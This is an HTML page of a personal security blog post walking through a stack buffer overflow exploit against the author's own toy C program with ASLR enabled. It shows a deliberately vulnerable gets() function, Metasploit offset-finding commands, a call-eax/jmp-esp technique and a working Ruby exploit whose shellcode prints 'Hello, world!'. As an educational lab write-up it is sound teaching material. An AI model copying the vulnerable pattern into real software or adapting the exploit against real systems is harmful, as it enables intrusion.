
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="ja"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Writing Buffer Overflow Exploits With ASLR - Sheep Shellcode</title>
  <meta name="author" content="Vincent Moscatello">

  
  <meta name="description" content="Today I decided to refresh my memory of buffer overflows by writing a short vulnerable program and then an exploit for it. To make things more &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://quantumvm.github.io//github/blog/2015/03/24/writing-buffer-overflow-exploits-with-aslr/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="Sheep Shellcode" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  
  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-67946241-1']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'stats.g.doubleclick.net/dc.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body >
  <div id="container">
    <header role="banner"><hgroup>
  <h1><a href="/">Sheep Shellcode</a></h1>
  
    <h2>The hackery blog of Vincent Moscatello.</h2>
  
</hgroup>

</header>
    <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:quantumvm.github.io//github" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/tutorials">Tutorials</a></li>
  <li><a href="/resume/MoscatelloResume.pdf">Resume</a></li>
  <li><a href="/archives">Archives</a></li>
</ul>

</nav>
    <div id="main">
      <div id="content">
        <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title"><a href="">Writing Buffer Overflow Exploits With ASLR</a></h1>
    
    
      <div class="post-meta">
        <p class="meta">
          <span class="timestamp">- 








  



<time datetime="2015-03-24T18:33:43-04:00" pubdate data-updated="true"></time> -</span>
          
        </p>
      </div>
    
  </header>


<div class="entry-content"><p>Today I decided to refresh my memory of buffer overflows by writing a short vulnerable program and then an exploit for it. To make things more interesting, I decided to challenge myself to write an exploit for the program that would work with ASLR enabled.</p>

<p><img class="center" src="/images/buffer-overflow-aslr/randomization-proc-sys-kernel.png"></p>

<p>The vulnerable program I wrote is found below. It uses the deprecated gets function which does not limit the amount of data being copied into its buffer. To avoid having to deal with DEP I decided to compile the program with the flag “-z execstack”.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">vulnerable</span><span class="p">(){</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">overflowed</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
</span><span class='line'>  <span class="n">gets</span><span class="p">(</span><span class="n">overflowed</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
</span><span class='line'>  <span class="n">vulnerable</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Time to dive into exploitation. The first step was to calculate how many bytes were needed to overflow the buffer on the stack. I decided to streamline the process and use the script pattern_create.rb which is found in the metasploit framework.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='BASH'><span class='line'>//Find generate pattern
</span><span class='line'>root@kali:~/Documents/buffer_overflow/dat# locate pattern_create.rb
</span><span class='line'>/usr/share/metasploit-framework/tools/pattern_create.rb
</span><span class='line'>//Generate pattern
</span><span class='line'>root@kali:~/Documents/buffer_overflow/dat# /usr/share/metasploit-framework/tools/pattern_create.rb <span class="m">64</span> &gt; pattern
</span></code></pre></td></tr></table></div></figure>


<p>Next step was to feed the pattern to the vulnerable program. It’s important to mention that before I did this I decided to enable core dumps to get an accurate representation of the program’s memory after it crashed.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='BASH'><span class='line'>//Enable core dumps
</span><span class='line'>root@kali:~/Documents/buffer_overflow# <span class="nb">ulimit</span> -c unlimited
</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="/images/buffer-overflow-aslr/firstsegfault.png"></p>

<p>To get the offset to the saved instructional pointer I just fed the address to pattern-offset.rb</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='BASH'><span class='line'>
</span><span class='line'>//pattern offset
</span><span class='line'>root@kali:~/Documents/buffer_overflow# locate pattern_offset.rb
</span><span class='line'>/usr/share/metasploit-framework/tools/pattern_offset.rb
</span><span class='line'>root@kali:~/Documents/buffer_overflow# /usr/share/metasploit-framework/tools/pattern_offset.rb 62413961
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Exact match at offset 28
</span></code></pre></td></tr></table></div></figure>


<p>To make sure this worked I wrote a one lined ruby command to make sure the program crashed to the address 0x42424242 (the ascii letter B) and then analyzed the core dump.</p>

<p><img class="center" src="/images/buffer-overflow-aslr/second-segfault.png"></p>

<p>One technique for making the buffer overflow exploit position independent is to jump to a register rather than a hardcoded address on the stack. A good register for this is esp. This works because although the contents of the register esp will change, the opcode to jump to esp will not. This can be shown by running the program twice and printing the contents of the registers using gdb.</p>

<p><img class="center" src="/images/buffer-overflow-aslr/inforeg1.png"></p>

<p><img class="center" src="/images/buffer-overflow-aslr/inforeg2.png"></p>

<p>The next picture below just illustrates how esp in the second picture above points just after the value used for overflowing the stack. Perfect spot to store shellcode!</p>

<p><img class="center" src="/images/buffer-overflow-aslr/looking-at-esp.png"></p>

<p>The next step is to find some location in the text segment that has the instruction jmp esp.  For most programs written in linux the position of the text segment does not change each time the program is executed even with ASLR enabled. The start address of the text segment is actually a hard coded value found in the elf header file. Great! A tool that can help us look for the opcodes is msfelfscan.</p>

<p>After running the command I felt a little stumped. The program did not use the instruction jmp esp anywhere in the text segment! My solution to this problem was to try and find a register with a different address that could be manipulated. Looking back at the register values at the time of crash eax seemed to fit the bill perfectly! The value of eax at the time of the crash stored the starting address of the data being copied onto the stack from gets. I ran msfelfscan a second time but this time looking for calls or jumps to eax. Found it.</p>

<p><img class="center" src="/images/buffer-overflow-aslr/calleax.png"></p>

<p>My solution for exploiting the program became the following:</p>

<ol>
<li>Generate the opcode for jump esp</li>
<li>Overwrite the value on the stack pointed to by eax with that opcode</li>
<li>Overwrite eip with the address of the call eax instruction.</li>
</ol>


<p>Since I don’t have the entire x86 instruction set memorized cough cough. I decided to write a short assembly program using nasm to get the opcode for jump esp. First I compiled the file with nasm using the flag –f elf. Then I linked the program using ld and ran the a.out file it generated using objdump.</p>

<p><img class="center" src="/images/buffer-overflow-aslr/objdump.png"></p>

<p>The full exploit, written in ruby, is found below. To test if it worked I used shellcode that should print a simple “hello world!” message.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1">#jump to eax</span>
</span><span class='line'><span class="c1">#eax calls esp</span>
</span><span class='line'><span class="c1">#esp points to shellcode</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\xeb\x13\x59\x31\xc0\xb0\x04\x31\xdb\x43\x31\xd2</span><span class="s2">&quot;</span><span class="o">+</span>
</span><span class='line'>          <span class="s2">&quot;</span><span class="se">\xb2\x0f\xcd\x80\xb0\x01\x4b\xcd\x80\xe8\xe8\xff</span><span class="s2">&quot;</span><span class="o">+</span>
</span><span class='line'>          <span class="s2">&quot;</span><span class="se">\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72</span><span class="s2">&quot;</span><span class="o">+</span>
</span><span class='line'>          <span class="s2">&quot;</span><span class="se">\x6c\x64\x21\x0a\x0d</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\x90\x90\xd4\xff</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">24</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x77\x83\x04\x08</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="n">payload</span>
</span></code></pre></td></tr></table></div></figure>


<p>And finally, pwnage.</p>

<p><img class="center" src="/images/buffer-overflow-aslr/pwnage.png"></p>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">Vincent Moscatello</span></span>

      








  



<time datetime="2015-03-24T18:33:43-04:00" pubdate data-updated="true"></time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/tutorials/'>tutorials</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2015/02/01/dll-injection-on-windows-xp/" title="Previous Post: Dll Injection on Windows XP">&laquo; Dll Injection on Windows XP</a>
      
      
        <a class="basic-alignment right" href="/blog/2015/09/02/a-tiny-easy-ctf-challenge/" title="Next Post: A Tiny Easy CTF Challenge">A Tiny Easy CTF Challenge &raquo;</a>
      
    </p>
  </footer>
</article>


</div>

      </div><!-- /div#content -->
    </div><!-- /div#main -->
  </div><!-- /div.container -->
  <footer><div id="footer-widgets-wrapper">
  <div id="footer-first" class="footer-widget">
    <h3>About Me</h3>
    <p>Hacker, programmer, tinkerer want to do all the things.</p>
    <section class="about-me">
      
      <div>
        <ul>
          
            <li>GitHub: <a href="https://github.com/quantumvm">@quantumvm</a></li>
          
          
            <li>Twitter: <a href="https://twitter.com/sheepshellcode">@sheepshellcode</a></li>
          
            <li>Blog: <a href="http://quantumvm.github.io//github">http://quantumvm.github.io//github</a></li>
        </ul>
      </div>
    </section>
  </div><!-- /div#footer-second -->

  <div id="footer-second" class="footer-widget">
    <h3>Involvement</h3>
	<img src="/images/SIT-ROOM.jpg" height=122 width=163 />
	<p>Most of my involvement revolves around being president of a club at UF called The Student Information Security Team.<b><p>

	Take a look:
	 
	<a href="http://www.ufsit.org">www.ufsit.org</a> 
	
  </div><!-- /div#footer-second -->

  <div id="footer-third" class="footer-widget">
    <h3>Academics</h3>
	<img src="/images/profile.jpg" height=122 width=140 />
  	<p>I am a Computer Science (Engineering) student at the University of Florida.</p>
	<p>B.S. Expected May 2016</p>
  </div><!-- /div#footer-third -->
</div><!-- /div#footer-widgets-wrapper -->

<div id="credit" role="contentinfo">
  <p>
    Copyright &copy; 2016 - <a href="https://github.com/Vincent Moscatello/">Vincent Moscatello</a> -
    <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
  </p>
</div>

</footer>
  














</body>
</html>
